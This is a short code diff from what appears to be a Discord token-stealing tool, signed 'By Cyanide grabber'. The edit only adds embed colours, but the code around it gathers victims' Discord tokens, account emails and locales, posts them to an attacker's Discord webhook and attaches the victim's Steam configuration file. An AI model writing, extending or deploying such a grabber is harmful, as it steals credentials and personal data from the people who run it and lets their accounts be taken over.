@@ -106,7 +106,7 @@ class Main:
             userinfo = nukelib.account_info(token)
             
             # icon url not work
-            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}")
+            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}", color="656166")
             embed.add_embed_field(name='Token', value=token)
             embed.add_embed_field(name='Locale', value=userinfo["locale"])
             embed.add_embed_field(name='Email', value=userinfo["email"])
@@ -119,7 +119,7 @@ class Main:
             self.webhook.add_embed(embed)
             r = self.webhook.execute()
 
-        embed = DiscordEmbed(title='Report')
+        embed = DiscordEmbed(title='Report', color="656166")
         embed.add_embed_field(name='Tokens', value=f"""```{tokens}```""")
         embed.set_footer(text='By Cyanide grabber')
         self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamConfig.txt")
